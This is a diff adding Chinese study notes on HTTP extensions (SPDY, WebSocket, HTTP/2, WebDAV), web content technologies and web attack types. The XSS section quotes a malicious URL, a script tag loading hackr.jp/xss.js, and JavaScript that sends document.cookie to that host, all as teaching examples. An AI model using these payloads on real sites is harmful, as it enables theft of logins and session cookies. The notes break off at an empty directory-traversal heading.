@@ -2230,6 +2230,522 @@ SSL的慢分两种。一种是指通信慢。另一种是指由于大量消耗 C
 
 某些 Web 页面只想让特定的人浏览，或者干脆仅本人可见。为达到 这个目标，必不可少的就是认证功能。下面我们一起来学习一下认证 机制。
 
+主要讲 Session 与 Cookie
+
+## 第 9 章 基于 HTTP 的功能追加 协议
+
+虽然 HTTP 协议既简单又简捷，但随着时代的发展，其功能使用上捉 襟见肘的疲态已经凸显。本章我们将讲解基于 HTTP 新增的功能的协 议。
+
+### 9.1 基于 HTTP 的协议
+ 在建立 HTTP 标准规范时，制订者主要想把 HTTP 当作传输 HTML文 档的协议。随着时代的发展，Web 的用途更具多样性，比如演化成在 线购物网站、SNS（Social Networking Service，社交网络服务）、企 业或组织内部的各种管理工具，等等。
+
+而这些网站所追求的功能可通过 Web 应用和脚本程序实现。即使这 些功能已经满足需求，在性能上却未必最优，这是因为 HTTP 协议上 的限制以及自身性能有限
+
+HTTP 功能上的不足可通过创建一套全新的协议来弥补。可是目前基 于 HTTP 的 Web 浏览器的使用环境已遍布全球，因此无法完全抛弃 HTTP。有一些新协议的规则是基于 HTTP 的，并在此基础上添加了新的功能
+
+### 9.2 消除 HTTP 瓶颈的 SPDY
+
+Google 在 2010 年发布了 SPDY（取自 SPeeDY，发音同 speedy），其 开发目标旨在解决 HTTP 的性能瓶颈，缩短 Web 页面的加载时间 （50%）。
+
+#### 9.2.1 HTTP 的瓶颈
+
+在 Facebook 和 Twitter 等 SNS 网站上，几乎能够实时观察到海量用户 公开发布的内容，这也是一种乐趣。当几百、几千万的用户发布内容 时，Web 网站为了保存这些新增内容，在很短的时间内就会发生大量 的内容更新
+
+为了尽可能实时地显示这些更新的内容，服务器上一有内容更新，就 需要直接把那些内容反馈到客户端的界面上。虽然看起来挺简单的， 但 HTTP 却无法妥善地处理好这项任务。
+
+使用 HTTP 协议探知服务器上是否有内容更新，就必须频繁地从客户 端到服务器端进行确认。如果服务器上没有内容更新，那么就会产生 徒劳的通信
+
+若想在现有 Web 实现所需的功能，以下这些 HTTP 标准就会成为瓶 颈。
+
+- 一条连接上只可发送一个请求。
+- 请求只能从客户端开始。客户端不可以接收除响应以外的指 令。
+- 请求 / 响应首部未经压缩就发送。首部信息越多延迟越大
+- 发送冗长的首部。每次互相发送相同的首部造成的浪费较 多。
+- 可任意选择数据压缩格式。非强制压缩发送
+
+![](https://blog.oss.yeetu.com/231004/06.png)
+
+**Ajax 的解决方法**
+
+Ajax（Asynchronous JavaScript and XML， 异 步 JavaScript 与 XML技 术）是一种有效利用 JavaScript 和 DOM（Document Object Model，文 档对象模型）的操作，以达到局部 Web 页面替换加载的异步通信手 段。和以前的同步通信相比，由于它只更新一部分页面，响应中传输 的数据量会因此而减少，这一优点显而易见。
+
+Ajax 的核心技术是名为 XMLHttpRequest 的 API，通过 JavaScript 脚本 语言的调用就能和服务器进行 HTTP 通信。借由这种手段，就能从已 加载完毕的 Web 页面上发起请求，只更新局部页面。
+
+而利用 Ajax 实时地从服务器获取内容，有可能会导致大量请求产 生。另外，Ajax 仍未解决 HTTP 协议本身存在的问题。
+
+**Comet 的解决方法**
+
+一旦服务器端有内容更新了，Comet 不会让请求等待，而是直接给客 户端返回响应。这是一种通过延迟应答，模拟实现服务器端向客户端 推送（Server Push）的功能。
+
+通常，服务器端接收到请求，在处理完毕后就会立即返回响应，但为 了实现推送功能，Comet 会先将响应置于挂起状态，当服务器端有内 容更新时，再返回该响应。因此，服务器端一旦有更新，就可以立即 反馈给客户端。
+
+内容上虽然可以做到实时更新，但为了保留响应，一次连接的持续时 间也变长了。期间，为了维持连接会消耗更多的资源。另外，Comet 也仍未解决 HTTP 协议本身存在的问题。
+
+![](https://blog.oss.yeetu.com/231004/07.png)
+
+**SPDY的目标**
+
+陆续出现的 Ajax 和 Comet 等  高易用性的技术，一定程度上使 HTTP 得到了改善，但 HTTP 协议本身的限制也令人有些束手无策。为了进 行根本性的改善，需要有一些协议层面上的改动
+
+处于持续开发状态中的 SPDY 协议，正是为了在协议级别消除 HTTP 所遭遇的瓶颈
+
+#### 9.2.2 SPDY的设计与功能
+
+SPDY 没有完全改写 HTTP 协议，而是在 TCP/IP 的应用层与运输层之 间通过新加会话层的形式运作。同时，考虑到安全性问题，SPDY 规 定通信中使用 SSL
+
+SPDY 以会话层的形式加入，控制对数据的流动，但还是采用 HTTP 建立通信连接。因此，可照常使用 HTTP 的 GET 和 POST 等方 法、 Cookie 以及 HTTP 报文等。
+
+使用 SPDY 后，HTTP 协议额外获得以下功能
+
+- 多路复用流
+
+通过单一的 TCP 连接，可以无限制处理多个 HTTP 请求。所有请求 的处理都在一条 TCP 连接上完成，因此 TCP 的处理效率得到  高。
+
+- 赋予请求优先级
+
+SPDY 不仅可以无限制地并发处理请求，还可以给请求逐个分配优先 级顺序。这样主要是为了在发送多个请求时，解决因带宽低而导致响 应变慢的问题
+
+- 压缩 HTTP 首部
+
+压缩 HTTP 请求和响应的首部。这样一来，通信产生的数据包数量和 发送的字节数就更少了
+
+- 推送功能
+支持服务器主动向客户端推送数据的功能。这样，服务器可直接发送 数据，而不必等待客户端的请求。
+
+- 服务器  示功能
+
+服务器可以主动￾ 示客户端请求所需的资源。由于在客户端发现资源 之前就可以获知资源的存在，因此在资源已缓存等情况下，可以避免发送不必要的请求
+
+#### 9.2.3 SPDY消除 Web 瓶颈了吗
+
+希望使用 SPDY 时，Web 的内容端不必做什么特别改动，而 Web 浏 览器及 Web 服务器都要为对应 SPDY 做出一定程度上的改动。有好 几家 Web 浏览器已经针对 SPDY 做出了相应的调整。另外，Web 服 务器也进行了实验性质的应用，但把该技术导入实际的 Web 网站却 进展不佳。
+
+因为 SPDY 基本上只是将单个域名（ IP 地址）的通信多路复用，所 以当一个 Web 网站上使用多个域名下的资源，改善效果就会受到限 制。
+
+SPDY 的确是一种可有效消除 HTTP 瓶颈的技术，但很多 Web 网站存 在的问题并非仅仅是由 HTTP 瓶颈所导致。对 Web 本身的速度  升，还应该从其他可细致钻研的地方入手，比如改善 Web 内容的编 写方式等。
+
+###  9.3 使用浏览器进行全双工通信的 WebSocket
+
+利用 Ajax 和 Comet 技术进行通信可以  升 Web 的浏览速度。但问题 在于通信若使用 HTTP 协议，就无法彻底解决瓶颈问题。WebSocket 网络技术正是为解决这些问题而实现的一套新协议及 API。
+
+当时筹划将 WebSocket 作为 HTML5 标准的一部分，而现在它却逐渐 变成了独立的协议标准。WebSocket 通信协议在 2011 年 12 月 11 日， 被 RFC 6455 - The WebSocket Protocol 定为标准。
+
+#### 9.3.1 WebSocket 的设计与功能
+
+WebSocket，即 Web 浏览器与 Web 服务器之间全双工通信标准。其 中，WebSocket 协议由 IETF 定为标准，WebSocket API 由 W3C 定为 标准。仍在开发中的 WebSocket 技术主要是为了解决 Ajax 和 Comet 里 XMLHttpRequest 附带的缺陷所引起的问题。
+
+#### 9.3.2 WebSocket 协议
+
+一旦 Web 服务器与客户端之间建立起 WebSocket 协议的通信连接， 之后所有的通信都依靠这个专用协议进行。通信过程中可互相发送 JSON、XML、HTML或图片等任意格式的数据。
+
+由于是建立在 HTTP 基础上的协议，因此连接的发起方仍是客户端， 而一旦确立 WebSocket 通信连接，不论服务器还是客户端，任意一方 都可直接向对方发送报文。
+
+下面我们列举一下 WebSocket 协议的主要特点。
+
+**推送功能**
+
+支持由服务器向客户端推送数据的推送功能。这样，服务器可直接发 送数据，而不必等待客户端的请求。
+
+**减少通信量**
+
+只要建立起 WebSocket 连接，就希望一直保持连接状态。和 HTTP 相 比，不但每次连接时的总开销减少，而且由于 WebSocket 的首部信息 很小，通信量也相应减少了。
+
+为了实现 WebSocket 通信，在 HTTP 连接建立之后，需要完成一 次“握手”（Handshaking）的步骤
+
+- 握手·请求
+
+为了实现 WebSocket 通信，需要用到 HTTP 的 Upgrade 首部字 段，告知服务器通信协议发生改变，以达到握手的目的
+
+```
+GET /chat HTTP/1.1 
+Host: server.example.com 
+Upgrade: websocket 
+Connection: Upgrade 
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ== 
+Origin: http://example.com 
+Sec-WebSocket-Protocol: chat, superchat 
+Sec-WebSocket-Version: 13
+```
+Sec-WebSocket-Key 字段内记录着握手过程中必不可少的键值。
+Sec-WebSocket-Protocol 字段内记录使用的子协议。
+
+子协议按 WebSocket 协议标准在连接分开使用时，定义那些连接 的名称。
+
+- 握手·响应
+对于之前的请求，返回状态码 101 Switching Protocols 的响应。
+
+
+```
+HTTP/1.1 101 Switching Protocols 
+Upgrade: websocket 
+Connection: Upgrade 
+Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo= 
+Sec-WebSocket-Protocol: chat
+```
+
+Sec-WebSocket-Accept 的字段值是由握手请求中的 Sec- WebSocket-Key 的字段值生成的。
+
+成功握手确立 WebSocket 连接之后，通信时不再使用 HTTP 的数 据帧，而采用 WebSocket 独立的数据帧
+
+![](https://blog.oss.yeetu.com/231004/08.png)
+
+- WebSocket API
+
+JavaScript 可调用“The WebSocket API”（http://www.w3.org/TR/websockets/，由 W3C 标准制定）内   供的 WebSocket 程序接口，以实现 WebSocket 协议下全双工通 信
+
+以下为调用 WebSocket API，每 50ms 发送一次数据的实例。
+
+```js
+var socket = new WebSocket('ws://game.example.com:12010/updates'); 
+socket.onopen = function () { 
+  setInterval(function() { 
+    if (socket.bufferedAmount == 0) 
+      socket.send(getUpdateData()); 
+  }, 50); 
+};
+```
+
+### 9.4 期盼已久的 HTTP/2.0
+
+目前主流的 HTTP/1.1 标准，自 1999 年发布的 RFC2616 之后再未进 行过改订。SPDY 和 WebSocket 等技术纷纷出现，很难断言 HTTP/1.1 仍是适用于当下的 Web 的协议。
+
+负责互联网技术标准的 IETF（Internet Engineering Task Force，互联网 工程任务组）创立 httpbis（Hypertext Transfer Protocol Bis，http://datatracker.ietf.org/wg/httpbis/）工作组，其目标是推进下一 代 HTTP——HTTP/2.0 在 2014 年 11 月实现标准化。
+
+**HTTP/2.0 的特点**
+
+HTTP/2.0 的目标是改善用户在使用 Web 时的速度体验。由于基本上 都会先通过 HTTP/1.1 与 TCP 连接，现在我们以下面的这些协议为基 础，探讨一下它们的实现方法。
+
+HTTP Speed ＋ Mobility 由微软公司起草，是用于改善并  高移动端 通信时的通信速度和性能的标准。它建立在 Google 公司  出的 SPDY 与 WebSocket 的基础之上。
+
+Network-Friendly HTTP Upgrade 主要是在移动端通信时改善 HTTP 性 能的标准。
+
+### 9.5 Web 服务器管理文件的 WebDAV
+
+WebDAV（Web-based Distributed Authoring and Versioning，基于万维网 的分布式创作和版本控制）是一个可对 Web 服务器上的内容直接进 行文件复制、编辑等操作的分布式文件系统。它作为扩展 HTTP/1.1 的协议定义在 RFC4918。
+
+除了创建、删除文件等基本功能，它还具备文件创建者管理、文件编 辑过程中禁止其他用户内容覆盖的加锁功能，以及对文件内容修改的 版本控制功能。
+
+使用 HTTP/1.1 的 PUT 方法和 DELETE 方法，就可以对 Web 服务器 上的文件进行创建和删除操作。可是出于安全性及便捷性等考虑，一 般不使用
+
+
+#### 9.5.1 扩展 HTTP/1.1 的 WebDAV
+
+针对服务器上的资源，WebDAV 新增加了一些概念，如下所示
+
+![](https://blog.oss.yeetu.com/231004/09.png)
+
+集合（Collection）：是一种统一管理多个资源的概念。以集合为 单位可进行各种操作。也可实现类似集合的集合这样的叠加。
+
+资源（Resource）：把文件或集合称为资源。
+
+属性（Property）：定义资源的属性。定义以“名称 = 值”的格式执 行。
+
+锁（Lock）：把文件设置成无法编辑状态。多人同时编辑时，可 防止在同一时间进行内容写入。
+
+#### 9.5.2 WebDAV 内新增的方法及状态码
+
+WebDAV 为实现远程文件管理，向 HTTP/1.1 中追加了以下这些方 法。
+
+PROPFIND ：获取属性
+PROPPATCH ：修改属性
+MKCOL ：创建集合
+COPY ：复制资源及属性
+MOVE ：移动资源
+LOCK ：资源加锁
+UNLOCK ：资源解锁
+
+为配合扩展的方法，状态码也随之扩展
+
+102 Processing ：可正常处理请求，但目前是处理中状态 
+207 Multi-Status ：存在多种状态 
+422 Unprocessible Entity ：格式正确，内容有误 
+423 Locked ：资源已被加锁 
+424 Failed Dependency ：处理与某请求关联的请求失败，因此不再维持依赖关系
+507 Insufficient Storage ：保存空间不足
+
+- WebDAV 的请求实例
+
+下面是使用 PROPFIND 方法对 http://www.example.com/file 发起 获取属性的请求。
+
+```
+PROPIND /file HTTP/1.1 
+Host: www.example.com 
+Content-Type: application/xml; 
+charset="utf-8" 
+Content-Length: 219 
+
+<?xml version="1.0" encoding="utf-8" ?> 
+<D:propfind xmlns:D="DAV:"> 
+  <D:prop xmlns:R="http://ns.example.com/boxschema/"> 
+    <R:bigbox/> 
+    <R:author/> 
+    <R:DingALing/> 
+    <R:Random/> 
+  </D:prop> 
+</D:propfind>
+```
+
+- WebDAV 的响应实例
+
+下面是针对之前的 PROPFIND 方法，返回 http://www.example.com/file 的属性的响应。
+
+```
+HTTP/1.1 207 Multi-Status 
+Content-Type: application/xml; 
+charset="utf-8" 
+Content-Length: 831 
+
+<?xml version="1.0" encoding="utf-8" ?> 
+<D:multistatus xmlns:D="DAV:"> 
+  <D:response xmlns:R="http://ns.example.com/boxschema/"> 
+    <D:href>http://www.example.com/file</D:href> 
+    <D:propstat> 
+      <D:prop> 
+        <R:bigbox> 
+        <R:BoxType>Box type A</R:BoxType> 
+        </R:bigbox>
+<R:author> <R:Name>J.J. Johnson</R:Name> </R:author> </D:prop> <D:status>HTTP/1.1 200 OK</D:status> </D:propstat> <D:propstat> <D:prop><R:DingALing/><R:Random/></D:prop> <D:status>HTTP/1.1 403 Forbidden</D:status> <D:responsedescription> The user does not have access to the DingALing property. </D:responsedescription> </D:propstat> </D:response> <D:responsedescription> There has been an access violation error. </D:responsedescription> </D:multistatus>
+```
+
+## 第 10 章 构建 Web 内容的技术
+
+在 Web 刚出现时，我们只能浏览那些页面样式简单的内容。如今， Web 使用各种各样的技术，来呈现丰富多彩的内容。
+
+### 10.1 HTML
+
+HTML（HyperText Markup Language，超文本标记语言）是为了发送 Web 上的超文本（Hypertext）而开发的标记语言。超文本是一种文档 系统，可将文档中任意位置的信息与其他信息（文本或图片等）建立 关联，即超链接文本。标记语言是指通过在文档的某部分穿插特别的 字符串标签，用来修饰文档的语言。我们把出现在 HTML文档内的 这种特殊字符串叫做 HTML标签（Tag）
+
+平时我们浏览的 Web 页面几乎全是使用 HTML写成的。由 HTML构 成的文档经过浏览器的解析、渲染后，呈现出来的结果就是 Web 页 面
+
+CSS（Cascading Style Sheets，层叠样式表）可以指定如何展现 HTML 内的各种元素，属于样式表标准之一。即使是相同的 HTML文档， 通过改变应用的 CSS，用浏览器看到的页面外观也会随之改变。CSS 的理念就是让文档的结构和设计分离，达到解耦的目的。
+
+### 10.2 动态 HTML
+
+所谓动态 HTML（Dynamic HTML），是指使用客户端脚本语言将静 态的 HTML内容变成动态的技术的总称。鼠标单击点开的新闻、 Google Maps 等可滚动的地图就用到了动态 HTML。
+
+动态 HTML技术是通过调用客户端脚本语言 JavaScript，实现对 HTML的 Web 页面的动态改造。利用 DOM（Document Object Model，文档对象模型）可指定欲发生动态变化的 HTML元素。
+
+DOM 是用以操作 HTML文档和 XML文档的 API（Application Programming Interface，应用编程接口）。使用 DOM 可以将 HTML内 的元素当作对象操作，如取出元素内的字符串、改变那个 CSS 的属 性等，使页面的设计发生改变。
+
+通过调用 JavaScript 等脚本语言对 DOM 的操作，可以以更为简单的 方式控制 HTML的改变。
+
+
+### 10.3 Web 应用
+
+Web 应用是指通过 Web 功能  供的应用程序。比如购物网站、网上 银行、SNS、BBS、搜索引擎和 e-learning 等。互联网（Internet）或企 业内网（Intranet）上遍布各式各样的 Web 应用。
+
+原本应用 HTTP 协议的 Web 的机制就是对客户端发来的请求，返回 事前准备好的内容。可随着 Web 越来越普及，仅靠这样的做法已不 足以应对所有的需求，更需要引入由程序创建 HTML内容的做法。
+
+类似这种由程序创建的内容称为动态内容，而事先准备好的内容称为 静态内容。Web 应用则作用于动态内容之上。
+
+CGI（Common Gateway Interface，通用网关接口）是指 Web 服务器在 接收到客户端发送过来的请求后转发给程序的一组机制。在 CGI 的 作用下，程序会对请求内容做出相应的动作，比如创建 HTML等动态内容。
+
+使用 CGI 的程序叫做 CGI 程序，通常是用 Perl、PHP、Ruby 和 C 等 编程语言编写而成。
+
+Servlet1 是一种能在服务器上创建动态内容的程序。Servlet 是用 Java 语言实现的一个接口，属于面向企业级 Java（JavaEE，Java Enterprise Edition）的一部分。
+
+
+之前  及的 CGI，由于每次接到请求，程序都要跟着启动一次。因此 一旦访问量过大，Web 服务器要承担相当大的负载。而 Servlet 运行 在与 Web 服务器相同的进程中，因此受到的负载较小 2。Servlet 的运 行环境叫做 Web 容器或 Servlet 容器。
+
+
+### 10.4 数据发布的格式及语言
+
+XML（eXtensible Markup Language，可扩展标记语言）是一种可按应 用目标进行扩展的通用标记语言。旨在通过使用 XML，使互联网数 据共享变得更容易。
+
+XML和 HTML都是从标准通用标记语言 SGML（Standard Generalized Markup Language）简化而成。与 HTML相比，它对数据的记录方式 做了特殊处理。
+
+## 第 11 章 Web 的攻击技术
+
+互联网上的攻击大都将 Web 站点作为目标。本章讲解具体有哪些攻 击 Web 站点的手段，以及攻击会造成怎样的影响。
+
+### 11.1 针对 Web 的攻击技术
+
+简单的 HTTP 协议本身并不存在安全性问题，因此协议本身几乎不会 成为攻击的对象。应用 HTTP 协议的服务器和客户端，以及运行在服 务器上的 Web 应用等资源才是攻击目标。
+
+目前，来自互联网的攻击大多是冲着 Web 站点来的，它们大多把 Web 应用作为攻击目标。本章主要针对 Web 应用的攻击技术进行讲 解。
+
+#### 11.1.1 HTTP 不具备必要的安全功能
+
+与最初的设计相比，现今的 Web 网站应用的 HTTP 协议的使用方式 已发生了翻天覆地的变化。几乎现今所有的 Web 网站都会使用会话 （session）管理、加密处理等安全性方面的功能，而 HTTP 协议内并 不具备这些功能。
+
+从整体上看，HTTP 就是一个通用的单纯协议机制。因此它具备较多 优势，但是在安全性方面则呈劣势。
+
+就拿远程登录时会用到的 SSH 协议来说，SSH 具备协议级别的认证 及会话管理等功能，HTTP 协议则没有。另外在架设 SSH 服务方面， 任何人都可以轻易地创建安全等级高的服务，而 HTTP 即使已架设好 服务器，但若想  供服务器基础上的 Web 应用，很多情况下都需要 重新开发。
+
+因此，开发者需要自行设计并开发认证及会话管理功能来满足 Web 应用的安全。而自行设计就意味着会出现各种形形色色的实现。结 果，安全等级并不完备，可仍在运作的 Web 应用背后却隐藏着各种 容易被攻击者滥用的安全漏洞的 Bug。
+
+#### 11.1.2 在客户端即可篡改请求
+
+在 Web 应用中，从浏览器那接收到的 HTTP 请求的全部内容，都可 以在客户端自由地变更、篡改。所以 Web 应用可能会接收到与预期 数据不相同的内容。
+
+在 HTTP 请求报文内加载攻击代码，就能发起对 Web 应用的攻击。 通过 URL查询字段或表单、HTTP 首部、Cookie 等途径把攻击代码传 入，若这时 Web 应用存在安全漏洞，那内部信息就会遭到窃取，或 被攻击者拿到管理权限。
+
+#### 11.1.3 针对 Web 应用的攻击模式
+
+对 Web 应用的攻击模式有以下两种
+- 主动攻击
+- 被动攻击
+
+- 以服务器为目标的主动攻击
+
+主动攻击（active attack）是指攻击者通过直接访问 Web 应用， 把攻击代码传入的攻击模式。由于该模式是直接针对服务器上的 资源进行攻击，因此攻击者需要能够访问到那些资源。
+
+主动攻击模式里具有代表性的攻击是 SQL注入攻击和 OS 命令注 入攻击。
+
+- 以服务器为目标的被动攻击
+
+被动攻击（passive attack）是指利用圈套策略执行攻击代码的攻 击模式。在被动攻击过程中，攻击者不直接对目标 Web 应用访 问发起攻击。
+
+被动攻击通常的攻击模式如下所示
+
+步骤 1： 攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发 送已嵌入攻击代码的 HTTP 请求
+
+步骤 2： 当用户不知不觉中招之后，用户的浏览器或邮件客户端 就会触发这个陷阱。
+
+步骤 3： 中招后的用户浏览器会把含有攻击代码的 HTTP 请求发 送给作为攻击目标的 Web 应用，运行攻击代码。
+
+步骤 4： 执行完攻击代码，存在安全漏洞的 Web 应用会成为攻 击者的跳板，可能导致用户所持的 Cookie 等个人信息被窃取， 登录状态中的用户权限遭恶意滥用等后果。
+
+被动攻击模式中具有代表性的攻击是跨站脚本攻击和跨站点请求 伪造。
+
+利用用户的身份攻击企业内部网络
+
+利用被动攻击，可发起对原本从互联网上无法直接访问的企业内 网等网络的攻击。只要用户踏入攻击者预先设好的陷阱，在用户 能够访问到的网络范围内，即使是企业内网也同样会受到攻击。
+
+很多企业内网依然可以连接到互联网上，访问 Web 网站，或接 收互联网发来的邮件。这样就可能给攻击者以可乘之机，诱导用 户触发陷阱后对企业内网发动攻击。
+
+### 11.2 因输出值转义不完全引发的安全漏洞
+
+实施 Web 应用的安全对策可大致分为以下两部分。
+
+- 客户端的验证
+- Web 应用端（服务器端）的验证 输入值验证 输出值转义
+
+多数情况下采用 JavaScript 在客户端验证数据。可是在客户端允许篡 改数据或关闭 JavaScript，不适合将 JavaScript 验证作为安全的防范 对策。保留客户端验证只是为了尽早地辨识输入错误，起到  高 UI 体验的作用。
+
+Web 应用端的输入值验证按 Web 应用内的处理则有可能被误认为是 具有攻击性意义的代码。输入值验证通常是指检查是否是符合系统业 务逻辑的数值或检查字符编码等预防对策。
+
+从数据库或文件系统、HTML、邮件等输出 Web 应用处理的数据之 际，针对输出做值转义处理是一项至关重要的安全策略。当输出值转 义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损 害。
+
+#### 11.2.1 跨站脚本攻击
+
+跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的 HTML标签或 JavaScript 进 行的一种攻击。动态创建的 HTML部分有可能隐藏着安全漏洞。就 这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一 不小心就会受到被动攻击
+跨站脚本攻击有可能造成以下影响。
+- 利用虚假输入表单骗取用户个人信息
+
+- 利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下， 帮助攻击者发送恶意请求。
+
+- 显示伪造的文章或图片。
+
+
+
+- 跨站脚本攻击案例
+
+在动态生成 HTML 处发生
+
+下面以编辑个人信息页面为例讲解跨站脚本攻击。下方界面显示 了用户输入的个人信息内容。
+
+![](https://blog.oss.yeetu.com/231004/10.png)
+
+此时的确认界面上，浏览器会把用户输入的 <s> 解析成 HTML 标签，然后显示删除线。
+
+删除线显示出来并不会造成太大的不利后果，但如果换成使用 script 标签将会如何呢。
+
+XSS 是攻击者利用预先设置的陷阱触发的被动攻击
+
+跨站脚本攻击属于被动攻击模式，因此攻击者会事先布置好用于 攻击的陷阱。
+
+下图网站通过地址栏中 URI 的查询字段指定 ID，即相当于在表 单内自动填写字符串的功能。而就在这个地方，隐藏着可执行跨 站脚本攻击的漏洞。
+
+![](https://blog.oss.yeetu.com/231004/11.png)
+
+充分熟知此处漏洞特点的攻击者，于是就创建了下面这段嵌入恶 意代码的 URL。并隐藏植入事先准备好的欺诈邮件中或 Web 页 面内，诱使用户去点击该 URL。
+
+```
+http://example.jp/login?ID="><script>var+f=document.getElementById("login");+f.action
+```
+
+浏览器打开该 URI 后，直观感觉没有发生任何变化，但设置好的 脚本却偷偷开始运行了。当用户在表单内输入 ID 和密码之后， 就会直接发送到攻击者的网站（也就是 hackr.jp），导致个人登 录信息被窃取。
+
+之后，ID 及密码会传给该正规网站，而接下来仍然是按正常登 录步骤，用户很难意识到自己的登录信息已遭泄露。
+
+- 对用户 Cookie 的窃取攻击
+
+除了在表单中设下圈套之外，下面那种恶意构造的脚本同样能够 以跨站脚本攻击的方式，窃取到用户的 Cookie 信息。
+
+```
+<script src=http://hackr.jp/xss.js></script>
+```
+
+该脚本内指定的 http://hackr.jp/xss.js 文件。即下面这段采用 JavaScript 编写的代码。
+
+```
+var content = escape(document.cookie); 
+document.write("<img src=http://hackr.jp/?"); 
+document.write(content); 
+document.write(">");
+```
+
+在存在可跨站脚本攻击安全漏洞的 Web 应用上执行上面这段 JavaScript 程序，即可访问到该 Web 应用所处域名下的 Cookie 信 息。然 后这些信息会发送至攻击者的 Web 网站 （http://hackr.jp/），记录在他的登录日志中。结果，攻击者就这 样窃取到用户的 Cookie 信息了。
+
+#### 11.2.2 SQL 注入攻击
+
+- 会执行非法 SQL 的 SQL 注入攻击
+
+SQL注入（SQLInjection）是指针对 Web 应用使用的数据库，通 过运行非法的 SQL而产生的攻击。该安全隐患有可能引发极大 的威胁，有时会直接导致个人信息及机密信息的泄露。
+
+Web 应用通常都会用到数据库，当需要对数据库表内的数据进行 检索或添加、删除等操作时，会使用 SQL语句连接数据库进行 特定的操作。如果在调用 SQL语句的方式上存在疏漏，就有可 能执行被恶意注入（Injection）非法 SQL语句。
+
+SQL注入攻击有可能会造成以下等影响。
+
+- 非法查看或篡改数据库内的数据
+
+- 规避认证
+
+- 执行和数据库服务器业务关联的程序等
+
+#### 11.2.3 OS 命令注入攻击
+
+OS 命令注入攻击（OS Command Injection）是指通过 Web 应用，执行 非法的操作系统命令达到攻击的目的。只要在能调用 Shell 函数的地 方就有存在被攻击的风险。
+
+可以从 Web 应用中通过 Shell 来调用操作系统命令。倘若调用 Shell 时存在疏漏，就可以执行插入的非法 OS 命令。
+
+OS 命令注入攻击可以向 Shell 发送命令，让 Windows 或 Linux 操作系 统的命令行启动程序。也就是说，通过 OS 注入攻击可执行 OS 上安 装着的各种程序。
+
+#### 11.2.4 HTTP 首部注入攻击
+
+HTTP 首部注入攻击（HTTP Header Injection）是指攻击者通过在响应 首部字段内插入换行，添加任意响应首部或主体的一种攻击。属于被动攻击模式。
+
+向首部主体内添加内容的攻击称为 HTTP 响应截断攻击（HTTP Response Splitting Attack）。
+
+如下所示，Web 应用有时会把从外部接收到的数值，赋给响应首部字 段 Location 和 Set-Cookie。
+
+```
+Location: http://www.example.com/a.cgi?q=12345 Set-Cookie: UID=12345 ＊12345就是插入值
+
+```
+
+HTTP 首部注入可能像这样，通过在某些响应首部字段需要处理输出 值的地方，插入换行发动攻击。
+
+HTTP 首部注入攻击有可能会造成以下一些影响。
+
+- 设置任何 Cookie 信息
+- 重定向至任意 URL
+- 显示任意的主体（HTTP 响应截断攻击）
+
+#### 11.2.5 邮件首部注入攻击
+
+邮件首部注入（Mail Header Injection）是指 Web 应用中的邮件发送功 能，攻击者通过向邮件首部 To 或 Subject 内任意添加非法内容发起的 攻击。利用存在安全漏洞的 Web 网站，可对任意邮件地址发送广告 邮件或病毒邮件。
+
+#### 11.2.6 目录遍历攻击
+
+
+
+
+
+
+
+
 
 
 
